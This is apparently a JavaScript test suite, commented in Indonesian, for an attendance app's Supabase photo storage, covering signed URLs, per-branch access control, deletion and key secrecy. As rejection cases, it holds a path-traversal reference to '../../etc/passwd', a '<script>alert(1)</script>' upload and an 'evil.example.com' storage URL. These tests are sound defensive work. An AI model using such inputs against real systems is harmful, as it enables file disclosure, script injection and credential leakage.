const SB_RE = /^[A-Za-z0-9_-]{2,40}\/\d{4}-\d{2}-\d{2}\/[0-9a-f-]{36}\.jpg$/;
ok(up.items.every(i => SB_RE.test(i.path) && i.path.startsWith('Majenang/')), 'path foto = Majenang/<tanggal>/<uuid>.jpg (acak, tidak bisa ditebak)');
ok(up.items.every(i => i.uploadUrl.startsWith(SB_URL + '/storage/v1/object/upload/sign/ohsnap-photos/Majenang/') && i.uploadUrl.includes('?token=')), 'URL unggah menuju Supabase dan membawa token sekali pakai');
ok(up.anonKey === SB_ANON, 'kunci anon (publik) dikembalikan untuk browser');
ok(!JSON.stringify(up).includes(SB_SERVICE), 'KUNCI SERVICE tidak ikut dikirim ke browser');

// -- meniru browser: FormData multipart seperti supabase-js
function browserUpload(item, bytes, key) {
  const B = '----WebKitFormBoundaryTEST';
  const body = Buffer.concat([
    Buffer.from(`--${B}\r\nContent-Disposition: form-data; name="cacheControl"\r\n\r\n3600\r\n--${B}\r\nContent-Disposition: form-data; name=""; filename="blob"\r\nContent-Type: image/jpeg\r\n\r\n`),
    bytes, Buffer.from(`\r\n--${B}--\r\n`)]);
  const u = new URL(item.uploadUrl);
  return fakeSb.handle({ method: 'PUT', path: u.pathname, query: u.searchParams,
    headers: { apikey: key, Authorization: 'Bearer ' + key, 'x-upsert': 'false', 'Content-Type': 'multipart/form-data; boundary=' + B }, body });
}
const jpeg = Buffer.concat([Buffer.from([0xff, 0xd8, 0xff, 0xe0]), crypto.randomBytes(2000)]);
ok(browserUpload(up.items[0], jpeg, SB_ANON).status === 200, 'browser dapat mengunggah foto lewat URL bertanda tangan');
ok(fakeSb.objects.get(up.items[0].path).equals(jpeg), 'isi foto tersimpan utuh (resolusi penuh, tanpa diubah)');
ok(browserUpload(up.items[0], jpeg, SB_ANON).status === 403, 'token unggah hanya berlaku SEKALI');
ok(browserUpload(up.items[1], jpeg, 'kunci-ngawur').status === 401, 'tanpa kunci API yang sah ditolak gateway');
ok(browserUpload({ uploadUrl: up.items[1].uploadUrl.replace(/token=[^&]+/, 'token=palsu') }, jpeg, SB_ANON).status === 403, 'token palsu ditolak');
ok(browserUpload(up.items[1], Buffer.from('<html><script>alert(1)</script></html>'), SB_ANON).status === 415, 'berkas non-gambar ditolak penyimpanan');
const otherItem = { uploadUrl: up.items[2].uploadUrl.replace('/Majenang/', '/Cilacap/') };
ok(browserUpload(otherItem, jpeg, SB_ANON).status === 403, 'token tidak bisa dipakai untuk path lain');
ok(browserUpload(up.items[2], jpeg, SB_ANON).status === 200, 'foto ke-2 berhasil diunggah');

// -- kirim laporan dengan referensi sb:
const mkAbs = (extra) => Object.assign({ recordType: 'ABSEN_MUKA', subType: 'MUKA_DATANG', cabang: 'Majenang', tanggal: '2026-11-20',
  waktu: '09:00:00', shift: 'Shift Pagi', nama: 'x', dedupKey: 'sb-' + Math.random() }, extra);
const sendRpt = (payloadObj) => postSb({ action: 'submit_report', token: wTok, payload: JSON.stringify(payloadObj) });
appended.length = 0; folderCalls = 0;
r14 = sendRpt(mkAbs({ fotoBukti: 'sb:' + up.items[0].path }));
const absRow = appended.find(a => a.sheet === 'Absen_Masuk');
const viewerLink = 'https://absen.ohsnap.web.id/foto.html#p=' + encodeURIComponent(up.items[0].path);
ok(r14.status === 'success', 'laporan dengan foto Supabase diterima');
ok(absRow && absRow.row.some(c => String(c) === viewerLink), 'Spreadsheet berisi LINK penampil foto (bukan data foto)');
ok(folderCalls === 0, 'tidak ada folder Google Drive yang dibuat/dipakai untuk foto ini');
ok(absRow && !absRow.row.some(c => String(c).startsWith('data:image')), 'tidak ada data foto base64 di sel Spreadsheet');

appended.length = 0;
sendRpt(mkAbs({ fotoBukti: 'sb:Majenang/2026-11-20/00000000-0000-4000-8000-000000000000.jpg' }));
ok(appended.find(a => a.sheet === 'Absen_Masuk').row.some(c => String(c).includes('foto belum ada di penyimpanan')), 'referensi ke foto yang belum terunggah dicatat apa adanya (laporan tetap tersimpan)');
appended.length = 0;
sendRpt(mkAbs({ fotoBukti: 'sb:Cilacap/2026-11-20/00000000-0000-4000-8000-000000000000.jpg' }));
ok(appended.find(a => a.sheet === 'Absen_Masuk').row.some(c => String(c).includes('referensi foto tidak valid')), 'referensi foto cabang lain ditolak');
appended.length = 0;
sendRpt(mkAbs({ fotoBukti: 'sb:../../etc/passwd' }));
ok(appended.find(a => a.sheet === 'Absen_Masuk').row.some(c => String(c).includes('referensi foto tidak valid')), 'path berbahaya (../) ditolak');

// -- Close Store: banyak foto sekaligus
const up2 = postSb({ action: 'photo_upload_urls', token: wTok, cabang: 'Majenang', count: 3 });
up2.items.forEach(i => browserUpload(i, jpeg, SB_ANON));
appended.length = 0;
sendRpt({ recordType: 'CLOSE_STORE', subType: 'CLOSE_BOOTH', cabang: 'Majenang', tanggal: '2026-11-20', waktu: '21:00:00', shift: 'Shift Sore', nama: 'x', dedupKey: 'cl-' + Math.random(),
  fotoBukti: 'sb:' + up2.items[0].path,
  closePhotosList: up2.items.map((i, n) => ({ label: 'Foto ' + (n + 1), base64: 'sb:' + i.path })) });
const closeRow = appended.find(a => a.sheet === 'Close_Store');
ok(closeRow && up2.items.every(i => closeRow.row.some(c => String(c).includes(encodeURIComponent(i.path)))), 'Close Store: ketiga link foto tertulis di Spreadsheet');

// -- melihat foto
const vw = postSb({ action: 'photo_view_url', token: wTok, path: up.items[0].path });
ok(vw.status === 'success' && vw.url.startsWith(SB_URL + '/storage/v1/object/sign/ohsnap-photos/Majenang/') && vw.url.includes('token='), 'kru mendapat URL lihat berumur pendek untuk foto cabangnya');
{ const u = new URL(vw.url); const got = fakeSb.handle({ method: 'GET', path: u.pathname, query: u.searchParams, headers: {}, body: Buffer.alloc(0) });
  ok(got.status === 200 && got.body.equals(jpeg), 'URL lihat mengembalikan foto asli resolusi penuh'); }
ok(postSb({ action: 'photo_view_url', token: wTok, path: 'Cilacap/2026-11-20/00000000-0000-4000-8000-000000000000.jpg' }).code === 'FORBIDDEN', 'kru tidak boleh melihat foto cabang lain');
ok(postSb({ action: 'photo_view_url', token: wTok, path: '../../x' }).code === 'BAD_REQUEST', 'path tidak valid ditolak');
ok(postSb({ action: 'photo_view_url', token: aTok, path: 'Cilacap/2026-11-20/00000000-0000-4000-8000-000000000000.jpg' }).status === 'success', 'admin boleh melihat foto semua cabang');
ok(postSb({ action: 'photo_view_url', token: aTok, path: 'BukanCabang/2026-11-20/00000000-0000-4000-8000-000000000000.jpg' }).code === 'FORBIDDEN', 'admin pun tidak bisa memakai folder yang bukan cabang terdaftar');
{ const u = new URL(vw.url); const bad = fakeSb.handle({ method: 'GET', path: u.pathname, query: new URLSearchParams('token=salah'), headers: {}, body: Buffer.alloc(0) });
  ok(bad.status === 400, 'URL lihat dengan token palsu ditolak'); }
{ const pub = fakeSb.handle({ method: 'GET', path: '/storage/v1/object/public/ohsnap-photos/' + up.items[0].path, query: new URLSearchParams(), headers: {}, body: Buffer.alloc(0) });
  ok(pub.status >= 400, 'tidak ada akses publik tanpa tanda tangan (bucket privat)'); }

ok(allResponses.every(s => !s.includes(SB_SERVICE)), 'kunci service TIDAK muncul di satu pun respons API');

// -- penghapusan
const delText = 'Link: ' + viewerLink + ' | ' + 'https://absen.ohsnap.web.id/foto.html#p=' + encodeURIComponent('Majenang/..%2F..%2Fx') ;
const nDel = env.trashDriveFilesFromUrlText(delText);
ok(nDel === 1 && !fakeSb.objects.has(up.items[0].path), 'admin hapus laporan -> foto di Supabase ikut terhapus; path tidak valid diabaikan');
ok(post({ action: 'delete_records', token: wTok, payload: '{}' }).code === 'FORBIDDEN', 'kru tetap tidak boleh menghapus data');

// -- uji koneksi bawaan
log.length = 0;
env.testSupabaseStorage();
ok(log.some(l => l.includes('SEMUA OK')), 'fungsi testSupabaseStorage() berjalan sukses terhadap tiruan Supabase');
log.length = 0;
for (const k of ['SUPABASE_URL', 'SUPABASE_SERVICE_KEY', 'SUPABASE_ANON_KEY', 'PHOTO_VIEWER_URL']) { const sv = propsStore[k]; delete propsStore[k]; env.testSupabaseStorage(); const hit = log.some(l => l.includes('belum lengkap')); propsStore[k] = sv; log.length = 0; if (!hit) { ok(false, 'konfigurasi tanpa ' + k + ' harus terdeteksi'); } }
ok(true, 'konfigurasi yang kurang terdeteksi oleh testSupabaseStorage()');
propsStore.SUPABASE_URL = 'https://evil.example.com';
ok(post({ action: 'photo_upload_urls', token: wTok, cabang: 'Majenang', count: 1 }).code === 'SB_DISABLED', 'SUPABASE_URL selain *.supabase.co ditolak (mencegah kunci dikirim ke server lain)');

console.log(`\n==== HASIL: ${pass} lulus, ${fail} gagal ====`);
process.exit(fail ? 1 : 0);
